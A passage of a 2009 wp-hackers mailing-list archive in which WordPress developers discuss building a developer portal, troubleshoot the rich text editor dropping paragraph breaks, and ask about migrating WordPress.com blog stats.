in.  (like on php.net if you pull up fopen() you'll also see links to
fread(), etc)  This would be good for folks that think one function is
what they want, but really there's a more efficient way of doing it
via another function or help you quickly find documentation on other
related functions you're going to need to use anyhow.

From jayarjo at gmail.com  Sat Dec 12 18:39:33 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sat, 12 Dec 2009 22:39:33 +0400
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
Message-ID: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>

For some reason freshly installed blog doesn't convert newlines
entered in posts rich text editor into paragraphs, as it usually does.
It just outputs text on one long line, without any breaks. Text
formatting works only if forcefully styled or aligned. Is it how it
should be? Never noticed such behavior in WordPress.

-- 
Davit Barbakadze

From william.canino at googlemail.com  Sat Dec 12 20:10:25 2009
From: william.canino at googlemail.com (William Canino)
Date: Sat, 12 Dec 2009 15:10:25 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <e4dc67e0912121210i58450f68m81dd016765d243dd@mail.gmail.com>

It already exists, Matt, and it's a wiki where anyone can contribute.
The url is http://codex.wordpress.org/ . I think you have heard of it.
<grin>

Unfortunately, there seems to be more people wishing for stuff in it
than people who are willing to contribute.

I'm just saying.

W.

2009/12/11 Matt Mullenweg <m at mullenweg.com>:
> If there were to be a developer portal for WordPress, someplace where if
> you're first getting started with hacking on WP, building plugins, creating
> themes, you could go and it'd have all the best resources in one place, what
> resources do you think would be important to have there?
>
> What do you wish you had when you first started developing for WordPress?
>
> (Bonus points if it's something that already exists, just scattered around.
> :))
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From feeds at armeda.com  Sat Dec 12 20:17:42 2009
From: feeds at armeda.com (Dre Armeda)
Date: Sat, 12 Dec 2009 12:17:42 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <e4dc67e0912121210i58450f68m81dd016765d243dd@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<e4dc67e0912121210i58450f68m81dd016765d243dd@mail.gmail.com>
Message-ID: <4B23FA66.2070507@armeda.com>

+1

Codex could probably use an overhaul in the usability department but I'm 
with William on this one. Better organization of the information in the 
codex to fit the needs of developers, designers, and new folks would 
help target the right people with the right information.

A lot of the resources exist, adding more functionality to the codex 
would be the way to go.

I would be interested in helping for sure.

Dre Armeda

On 12/12/09 12:10 PM, William Canino wrote:
> It already exists, Matt, and it's a wiki where anyone can contribute.
> The url is http://codex.wordpress.org/ . I think you have heard of it.
> <grin>
>
> Unfortunately, there seems to be more people wishing for stuff in it
> than people who are willing to contribute.
>
> I'm just saying.
>
> W.
>
> 2009/12/11 Matt Mullenweg<m at mullenweg.com>:
>    
>> If there were to be a developer portal for WordPress, someplace where if
>> you're first getting started with hacking on WP, building plugins, creating
>> themes, you could go and it'd have all the best resources in one place, what
>> resources do you think would be important to have there?
>>
>> What do you wish you had when you first started developing for WordPress?
>>
>> (Bonus points if it's something that already exists, just scattered around.
>> :))
>>
>> --
>> Matt Mullenweg
>> http://ma.tt | http://wordpress.org | http://automattic.com
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>      
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

From erisds at gmail.com  Sat Dec 12 21:05:55 2009
From: erisds at gmail.com (ErisDS)
Date: Sat, 12 Dec 2009 21:05:55 +0000
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B23FA66.2070507@armeda.com>
References: <4B22AD95.8040401@mullenweg.com>
	<e4dc67e0912121210i58450f68m81dd016765d243dd@mail.gmail.com> 
	<4B23FA66.2070507@armeda.com>
Message-ID: <686d0bd70912121305g25321279u78869efcd86d4b6f@mail.gmail.com>

1. Details of all the ways to contact/communicate/get info - the mailing
lists, irc rooms, dev blog etc
2. Quick access to the function reference (and perhaps better organisation
of it) + a dedicated function search
3. Complete details of all the functions (minimum function signature,
options, return vals etc) + more code examples (even if it's just a link to
relevant core code in SVN)


Something which deals with best practices would be good as well,
particularly for plugins. Maybe a collection of the best written plugins for
reference?

I think most of the info is all there, it could just do with a developer
landing page and some better organisation. Also I guess we all have to get
more involved with the docs to make them complete for others.

From malaiac at gmail.com  Sat Dec 12 22:12:57 2009
From: malaiac at gmail.com (Malaiac)
Date: Sat, 12 Dec 2009 23:12:57 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <686d0bd70912121305g25321279u78869efcd86d4b6f@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<e4dc67e0912121210i58450f68m81dd016765d243dd@mail.gmail.com>
	<4B23FA66.2070507@armeda.com>
	<686d0bd70912121305g25321279u78869efcd86d4b6f@mail.gmail.com>
Message-ID: <59e7f3130912121412s65a96c5cs4d2a8b229061d0d8@mail.gmail.com>

2009/12/12 ErisDS <erisds at gmail.com>:
> 1. Details of all the ways to contact/communicate/get info - the mailing
> lists, irc rooms, dev blog etc

bonus would be one or two typical questions you can hope finding an
answer for, for each channel.

M

From jordi at jcanals.cat  Sat Dec 12 22:35:47 2009
From: jordi at jcanals.cat (Jordi Canals)
Date: Sat, 12 Dec 2009 23:35:47 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
	<4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>
	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>
	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>
	<65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
Message-ID: <eccf1e7c0912121435y742e2fapef81718b0e0ef9c5@mail.gmail.com>

2009/12/12 Simon Blackbourn <piemanek at gmail.com>

A whole section on plugin security (using wp_nonce, avoiding xss, things to
> be aware of when handling user input, etc.).
>
> A lot of this is not specific to WordPress of course, but I think a lot of
> self-taught coders (myself included) really first got to grips with PHP
> through writing WordPress plugins and themes.
>
> An easy to follow security checklist, plus other WordPress-specific info,
> plus links to existing security resources online would have been very
> welcome.
>
>
Really a best practices for plugins and themes security is a must. Specially
when them allow input from anybody else than administrators.
The security checklist for nonces and sanitizes would be really appreciated.
Most of us have security on mind, but always can forget something, and
having it from the WordPress point of view would be useful.

Have more information about the best way to sanitize an option, an email or
a text string by using the core WP functions, will help to avoid releasing
any insecure plugin or theme.

Jordi Canals
http://alkivia.org

From jordi at jcanals.cat  Sat Dec 12 22:41:11 2009
From: jordi at jcanals.cat (Jordi Canals)
Date: Sat, 12 Dec 2009 23:41:11 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <eccf1e7c0912121441q465a5cd3wf7ca601a202ed272@mail.gmail.com>

2009/12/11 Matt Mullenweg <m at mullenweg.com>

>
> What do you wish you had when you first started developing for WordPress?
>
>
A quick flowchart of how and when WordPress loads every piece, and the order
it fires actions and filters.
For example:
- Load plugins .> load child themes -> load parent themes
- Fires 'plugins_loaded' -> fires 'widgets_init' -> fires 'init'

This would help to find the best place to plug a hook. This was something I
missed when started developing for WP (and sometimes still is)

Jordi Canals
http://alkivia.org

From m at mullenweg.com  Sat Dec 12 22:42:59 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Sat, 12 Dec 2009 14:42:59 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <bc45bff60912111244m20a1a8abr551c28de8fd6b3e4@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<bc45bff60912111244m20a1a8abr551c28de8fd6b3e4@mail.gmail.com>
Message-ID: <4B241C73.8070202@mullenweg.com>

On 2009-12-11 12:44 PM, Melissa P. wrote:
> - Tips to disable everything that makes WP run slow ?.?

I would like those tips too, what are they? :)

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From feeds at armeda.com  Sat Dec 12 22:42:47 2009
From: feeds at armeda.com (Dre Feeds)
Date: Sat, 12 Dec 2009 14:42:47 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <eccf1e7c0912121435y742e2fapef81718b0e0ef9c5@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
	<4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>
	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>
	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>
	<65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
	<eccf1e7c0912121435y742e2fapef81718b0e0ef9c5@mail.gmail.com>
Message-ID: <E87AA41A-8C51-48A6-A5BF-6016842A7724@armeda.com>

We should get all these great ideas up on a page.

Cheers,
Dre Armeda
http://armeda.com

Sent from my iPhone

On Dec 12, 2009, at 2:35 PM, Jordi Canals <jordi at jcanals.cat> wrote:

> 2009/12/12 Simon Blackbourn <piemanek at gmail.com>
>
> A whole section on plugin security (using wp_nonce, avoiding xss,  
> things to
>> be aware of when handling user input, etc.).
>>
>> A lot of this is not specific to WordPress of course, but I think a  
>> lot of
>> self-taught coders (myself included) really first got to grips with  
>> PHP
>> through writing WordPress plugins and themes.
>>
>> An easy to follow security checklist, plus other WordPress-specific  
>> info,
>> plus links to existing security resources online would have been very
>> welcome.
>>
>>
> Really a best practices for plugins and themes security is a must.  
> Specially
> when them allow input from anybody else than administrators.
> The security checklist for nonces and sanitizes would be really  
> appreciated.
> Most of us have security on mind, but always can forget something, and
> having it from the WordPress point of view would be useful.
>
> Have more information about the best way to sanitize an option, an  
> email or
> a text string by using the core WP functions, will help to avoid  
> releasing
> any insecure plugin or theme.
>
> Jordi Canals
> http://alkivia.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From m at mullenweg.com  Sat Dec 12 23:14:01 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Sat, 12 Dec 2009 15:14:01 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B23FA66.2070507@armeda.com>
References: <4B22AD95.8040401@mullenweg.com>	<e4dc67e0912121210i58450f68m81dd016765d243dd@mail.gmail.com>
	<4B23FA66.2070507@armeda.com>
Message-ID: <4B2423B9.4010103@mullenweg.com>

On 2009-12-12 12:17 PM, Dre Armeda wrote:
> Codex could probably use an overhaul in the usability department but I'm
> with William on this one. Better organization of the information in the
> codex to fit the needs of developers, designers, and new folks would
> help target the right people with the right information.
>
> A lot of the resources exist, adding more functionality to the codex
> would be the way to go.

I don't like putting new things on the Codex because it's difficult to 
work with, doesn't share our login system, and the platform is a pain to 
work with.

There will be a new site regardless, I think developers deserve their 
own resource independent from the Codex and a lot of the requests we've 
had here aren't things that should be done in the Codex anyway.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From mikeschinkel at newclarity.net  Sat Dec 12 23:34:06 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 12 Dec 2009 18:34:06 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B2423B9.4010103@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>	<e4dc67e0912121210i58450f68m81dd016765d243dd@mail.gmail.com>
	<4B23FA66.2070507@armeda.com> <4B2423B9.4010103@mullenweg.com>
Message-ID: <972FEED3-30C5-4B6E-89FB-6A49268A408F@newclarity.net>

On Dec 12, 2009, at 6:14 PM, Matt Mullenweg wrote:
> There will be a new site regardless, I think developers deserve their own resource independent from the Codex and a lot of the requests we've had here aren't things that should be done in the Codex anyway.

Any maybe give it a name that doesn't require someone to be a MMORG player to be able to recognize what it means? :-)

-Mike


From feeds at armeda.com  Sat Dec 12 23:51:17 2009
From: feeds at armeda.com (Dre Feeds)
Date: Sat, 12 Dec 2009 15:51:17 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B2423B9.4010103@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>	<e4dc67e0912121210i58450f68m81dd016765d243dd@mail.gmail.com>
	<4B23FA66.2070507@armeda.com> <4B2423B9.4010103@mullenweg.com>
Message-ID: <B613C282-3017-46E2-9DE8-50A449301C5D@armeda.com>

Fair enough, Let's get'r done :-)

Single sign on would definitely be good.

A new site is great but we need to migrate or tie into existing  
resources smartly. If not we end up with unneeded redundancies that  
make things worse instead of better.

Cheers,
Dre Armeda
http://armeda.com

Sent from my iPhone

On Dec 12, 2009, at 3:14 PM, Matt Mullenweg <m at mullenweg.com> wrote:

> On 2009-12-12 12:17 PM, Dre Armeda wrote:
>> Codex could probably use an overhaul in the usability department  
>> but I'm
>> with William on this one. Better organization of the information in  
>> the
>> codex to fit the needs of developers, designers, and new folks would
>> help target the right people with the right information.
>>
>> A lot of the resources exist, adding more functionality to the codex
>> would be the way to go.
>
> I don't like putting new things on the Codex because it's difficult  
> to work with, doesn't share our login system, and the platform is a  
> pain to work with.
>
> There will be a new site regardless, I think developers deserve  
> their own resource independent from the Codex and a lot of the  
> requests we've had here aren't things that should be done in the  
> Codex anyway.
>
> -- 
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From chris at clwill.com  Sun Dec 13 01:12:37 2009
From: chris at clwill.com (Chris Williams)
Date: Sat, 12 Dec 2009 20:12:37 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B2423B9.4010103@mullenweg.com>
Message-ID: <C7497F85.4AA7%chris@clwill.com>

+1

Being a wiki is a blessing and a curse.  Best would be something that is controlled and edited to be clear, clean, accurate, etc.  And kept fresh.

Too much of the codex is dupes, out of date, or... wrong.


________________________________
From: Matt Mullenweg <m at mullenweg.com>
Subject: Re: [wp-hackers] Developer portal

I don't like putting new things on the Codex because it's difficult to
work with, doesn't share our login system, and the platform is a pain to
work with.

There will be a new site regardless, I think developers deserve their
own resource independent from the Codex and a lot of the requests we've
had here aren't things that should be done in the Codex anyway.

From malaiac at gmail.com  Sun Dec 13 01:16:56 2009
From: malaiac at gmail.com (Malaiac)
Date: Sun, 13 Dec 2009 02:16:56 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <C7497F85.4AA7%chris@clwill.com>
References: <4B2423B9.4010103@mullenweg.com> <C7497F85.4AA7%chris@clwill.com>
Message-ID: <59e7f3130912121716x752e0da0y6be3f42120c13c42@mail.gmail.com>

2009/12/13 Chris Williams <chris at clwill.com>:
> +1
>
> Being a wiki is a blessing and a curse. ?Best would be something that is controlled and edited to be clear, clean, accurate, etc. ?And kept fresh.


comments on php.net pages are unclean, unclear, but still way more
helpful than many Codex pages....

M

From mikeschinkel at newclarity.net  Sun Dec 13 01:25:04 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 12 Dec 2009 20:25:04 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <59e7f3130912121716x752e0da0y6be3f42120c13c42@mail.gmail.com>
References: <4B2423B9.4010103@mullenweg.com> <C7497F85.4AA7%chris@clwill.com>
	<59e7f3130912121716x752e0da0y6be3f42120c13c42@mail.gmail.com>
Message-ID: <1F69CB05-B79B-43BC-B4E8-7820FCFAB966@newclarity.net>

> comments on php.net pages are unclean, unclear, but still way more
> helpful than many Codex pages....

Better to have a controlled section and an open section that only one open section that appears to the uninitiated as a controlled section. JMTCW.

-Mike

On Dec 12, 2009, at 8:16 PM, Malaiac wrote:

> 2009/12/13 Chris Williams <chris at clwill.com>:
>> +1
>> 
>> Being a wiki is a blessing and a curse.  Best would be something that is controlled and edited to be clear, clean, accurate, etc.  And kept fresh.
> 
> 
> comments on php.net pages are unclean, unclear, but still way more
> helpful than many Codex pages....
> 
> M
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From gaarai at gaarai.com  Sun Dec 13 02:14:01 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Sat, 12 Dec 2009 20:14:01 -0600
Subject: [wp-hackers] newlines from rich text editor do not convert to
 paragraphs
In-Reply-To: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
Message-ID: <4B244DE9.6050909@gaarai.com>

Which version are you running? Do you have any plugins installed and 
activated?

Chris Jean
http://gaarai.com/
@chrisjean


On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
> For some reason freshly installed blog doesn't convert newlines
> entered in posts rich text editor into paragraphs, as it usually does.
> It just outputs text on one long line, without any breaks. Text
> formatting works only if forcefully styled or aligned. Is it how it
> should be? Never noticed such behavior in WordPress.
>
>    

From shane at bugssite.org  Sun Dec 13 05:24:35 2009
From: shane at bugssite.org (Shane A. Froebel)
Date: Sun, 13 Dec 2009 00:24:35 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <1F69CB05-B79B-43BC-B4E8-7820FCFAB966@newclarity.net>
References: <4B2423B9.4010103@mullenweg.com> <C7497F85.4AA7%chris@clwill.com>
	<59e7f3130912121716x752e0da0y6be3f42120c13c42@mail.gmail.com>
	<1F69CB05-B79B-43BC-B4E8-7820FCFAB966@newclarity.net>
Message-ID: <4B247A93.70707@bugssite.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

While I am an expert also in Mediawiki stuff (BSG Wiki is one of my
major sites), using it for programing purposes has always been tough. I
do like the way php.net does their setup and I think we could go like
that for developers.

My 2 cents.

Your Friend,
Shane

On 12/12/2009 8:25 PM, Mike Schinkel wrote:
>> comments on php.net pages are unclean, unclear, but still way more
>> helpful than many Codex pages....
> 
> Better to have a controlled section and an open section that only one open section that appears to the uninitiated as a controlled section. JMTCW.
> 
> -Mike
> 
> On Dec 12, 2009, at 8:16 PM, Malaiac wrote:
> 
>> 2009/12/13 Chris Williams <chris at clwill.com>:
>>> +1
>>>
>>> Being a wiki is a blessing and a curse.  Best would be something that is controlled and edited to be clear, clean, accurate, etc.  And kept fresh.
>>
>>
>> comments on php.net pages are unclean, unclear, but still way more
>> helpful than many Codex pages....
>>
>> M
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (MingW32)

iQIcBAEBAgAGBQJLJHqTAAoJEC7/vS6gbNwFiFsP/0eN0SkHnSRXTsY6vJvug+7t
b5dK5oalLel9JJTpyqSdvDtvV7YvPYyQvDpb01MlzSThbpL0GB1MnOAnLcA6CASz
Yb1Hdh6SZJnZ1tfGkTtden1g5lHJyF40r+8uMop4Wov1nTOWld4oC1bo0pS2jg5o
6ANtuczb7YBU9yjVBHHFNbxWQCEA2qbY0LbRj6/4/qtSaAWUHvmGGWu4e6BXzypP
6A135tE8N+Tjz2ZVudGQsGHw+0KSV+r2qQigDHnAPNP77r1NdAVJVb++h/1KqWY4
+BqkZRy2u7eNnrcX9iHJa1rUnfECBEU7FEefrF++2ZsZTu3nuToOav21jXofcPkF
3qqvg5GituUnXDPl81KeB27qtCT0jLYV5FkulrzaeQ2uXVpkdB67VrHDazWGaeR3
NPB3ekgnbnm8216wLuydK0y/Y7op9nP91JctNK7/fKHEABlT+I738OhPd1Cf43Jg
s1aVOyelBylzIfYnalprBieA+bLhuNI8PGjMOS9dgoDdo0k74C5v1j35NXN/nChi
NHGoPswkSN5A+QsN0kGVfBAsdanzUGwfGQfdTmUMYXJY7ds6rd7jrSfRbLmT8peU
4YSpdSsRK+oxaUDWfu6XUQ81BmJPD0py0RGlQ9cH9DiilUUxTLdmkZdvVGyv6iMd
7mS0AcMu2KZ6Jj8mLjQ1
=Pbpf
-----END PGP SIGNATURE-----

From jayarjo at gmail.com  Sun Dec 13 08:27:08 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sun, 13 Dec 2009 12:27:08 +0400
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <4B244DE9.6050909@gaarai.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<4B244DE9.6050909@gaarai.com>
Message-ID: <9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>

I'm running 2.8.6. Plugins I got are:

All in One SEO Pack
Ozh' Admin Drop Down Menu
qTranslate

But I've used them before without such problems. At least I haven't
noticed them.

So it is not a proper behavior? Is it switchable? On/Off somewhere?


On Sun, Dec 13, 2009 at 6:14 AM, Chris Jean <gaarai at gaarai.com> wrote:
> Which version are you running? Do you have any plugins installed and
> activated?
>
> Chris Jean
> http://gaarai.com/
> @chrisjean
>
>
> On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
>>
>> For some reason freshly installed blog doesn't convert newlines
>> entered in posts rich text editor into paragraphs, as it usually does.
>> It just outputs text on one long line, without any breaks. Text
>> formatting works only if forcefully styled or aligned. Is it how it
>> should be? Never noticed such behavior in WordPress.
>>
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From jayarjo at gmail.com  Sun Dec 13 08:29:39 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sun, 13 Dec 2009 12:29:39 +0400
Subject: [wp-hackers] Blog Stats from WordPress.com to stand-alone
	wordpress?..
In-Reply-To: <9aa12a490912110756w2b8970e6y6d57e364deb503a7@mail.gmail.com>
References: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com>
	<7f49e8010912110618v3952b38dg6720bf2d3a9eb423@mail.gmail.com>
	<9aa12a490912110756w2b8970e6y6d57e364deb503a7@mail.gmail.com>
Message-ID: <9aa12a490912130029i6184d388g451853535d2f4fc2@mail.gmail.com>

So it is not possible to associate Blog Stats which we got on
Wordpress.com with standalone wordpress.org installation?

On Fri, Dec 11, 2009 at 7:56 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:
> Well, I'm moving a blog from wordpress.com to standalone installation.
> On wordpress.com it had hundreds of thousands hits and I somehow do
> not want to loose that data after I move to standalone version. Domain
> stays the same. It's just that I'm not sure how to not lose those hits
> and visualize them using the widget on my new wordpress installation.
>
> On Fri, Dec 11, 2009 at 6:18 PM, Pete Mall <pete at jointforcestech.com> wrote:
>> Are you trying to:
>>
>> ? 1. Show the hits from the .com blog on the .org blog dashboard; or
>> ? 2. Track the hits on your .org blog using WordPress.com stats; or
>> ? 3. Trying to add the hits on your .com and .org blogs and show them on
>> ? the .org dashboard?
>>
>>
>> On Fri, Dec 11, 2009 at 6:00 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>>
>>> Is there any way to transfer Blog Stats (page hits that is) from
>>> WordPress.com to stand-alone wordpress installation? Is it a plugin of
>>> some kind?
>>>
>>> --
>>> Davit Barbakadze
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> Davit Barbakadze
>



-- 
Davit Barbakadze

From mccormicky at gmail.com  Sun Dec 13 08:47:36 2009
From: mccormicky at gmail.com (mccormicky)
Date: Sun, 13 Dec 2009 03:47:36 -0500
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<4B244DE9.6050909@gaarai.com>
	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
Message-ID: <d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>

 If you hit the return key or insert a <br/> in html mode then switch to
visual (rich text) and save, they get wiped out.
But if you make line breaks with <br/> in html mode or hit the return key -
and hit save it gets saved.
- it might be a browser issue though. Not sure. I always use the html mode
so I am not often bothered by it.
It isn't a new behavior of 2.8.6 -  I have had complaints about the editor
from clients for years.
Loss of formatting goes goes hand in hand with rich text editing & I tell
them to use the html mode but they don't often listen..


On Sun, Dec 13, 2009 at 3:27 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:

> I'm running 2.8.6. Plugins I got are:
>
> All in One SEO Pack
> Ozh' Admin Drop Down Menu
> qTranslate
>
> But I've used them before without such problems. At least I haven't
> noticed them.
>
> So it is not a proper behavior? Is it switchable? On/Off somewhere?
>
>
> On Sun, Dec 13, 2009 at 6:14 AM, Chris Jean <gaarai at gaarai.com> wrote:
> > Which version are you running? Do you have any plugins installed and
> > activated?
> >
> > Chris Jean
> > http://gaarai.com/
> > @chrisjean
> >
> >
> > On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
> >>
> >> For some reason freshly installed blog doesn't convert newlines
> >> entered in posts rich text editor into paragraphs, as it usually does.
> >> It just outputs text on one long line, without any breaks. Text
> >> formatting works only if forcefully styled or aligned. Is it how it
> >> should be? Never noticed such behavior in WordPress.
> >>
> >>
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jayarjo at gmail.com  Sun Dec 13 09:06:09 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sun, 13 Dec 2009 13:06:09 +0400
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<4B244DE9.6050909@gaarai.com>
	<9aa12a490912130027v2ecf3f58j4a48582c2b9b0624@mail.gmail.com>
	<d7153760912130047x3092515fm4c2682a3d5e77a38@mail.gmail.com>
Message-ID: <9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>

It is understandable, 'cause it should be very handy feature,
especially when one has media and style rich posts. Using html editor
is not an option for some people at all (not familiar with html and do
not bother to learn it - why should they in fact?)

Does any one know at least what is a hook/filter, which is meant to
accomplish that converting task?

On Sun, Dec 13, 2009 at 12:47 PM, mccormicky <mccormicky at gmail.com> wrote:
> ?If you hit the return key or insert a <br/> in html mode then switch to
> visual (rich text) and save, they get wiped out.
> But if you make line breaks with <br/> in html mode or hit the return key -
> and hit save it gets saved.
> - it might be a browser issue though. Not sure. I always use the html mode
> so I am not often bothered by it.
> It isn't a new behavior of 2.8.6 - ?I have had complaints about the editor
> from clients for years.
> Loss of formatting goes goes hand in hand with rich text editing & I tell
> them to use the html mode but they don't often listen..
>
>
> On Sun, Dec 13, 2009 at 3:27 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>
>> I'm running 2.8.6. Plugins I got are:
>>
>> All in One SEO Pack
>> Ozh' Admin Drop Down Menu
>> qTranslate
>>
>> But I've used them before without such problems. At least I haven't
>> noticed them.
>>
>> So it is not a proper behavior? Is it switchable? On/Off somewhere?
>>
>>
>> On Sun, Dec 13, 2009 at 6:14 AM, Chris Jean <gaarai at gaarai.com> wrote:
>> > Which version are you running? Do you have any plugins installed and
>> > activated?
>> >
>> > Chris Jean
>> > http://gaarai.com/
>> > @chrisjean
>> >
>> >
>> > On 12/12/2009 12:39 PM, Davit Barbakadze wrote:
>> >>
>> >> For some reason freshly installed blog doesn't convert newlines
>> >> entered in posts rich text editor into paragraphs, as it usually does.
>> >> It just outputs text on one long line, without any breaks. Text
>> >> formatting works only if forcefully styled or aligned. Is it how it
>> >> should be? Never noticed such behavior in WordPress.
>> >>
>> >>
>> >
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>>
>>
>>
>> --
>> Davit Barbakadze
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From mccormicky at gmail.com  Sun Dec 13 11:10:57 2009
From: mccormicky at gmail.com (mccormicky)
Date: Sun, 13 Dec 2009 06:10:57 -0500
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <9aa12a490912130106v69ea595eva2cebebc1104da51@mail.gmail.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
